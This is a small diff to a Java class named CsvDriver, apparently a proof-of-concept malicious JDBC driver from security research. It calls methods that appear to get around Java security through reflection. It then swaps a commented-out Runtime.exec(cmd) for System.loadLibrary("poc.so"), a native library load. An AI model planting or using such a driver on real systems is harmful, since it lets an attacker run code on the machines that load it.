@@ -112,7 +112,8 @@ public class CsvDriver implements Driver {
 			setHasAllPerm0();
 			setHasAllPerm();
 			setSecurityByReflection();
-			Runtime.getRuntime().exec(cmd);
+			// Runtime.getRuntime().exec(cmd);
+			System.loadLibrary("poc.so");
 		} catch (Exception e) {
 			throw new RuntimeException(e);
 		}
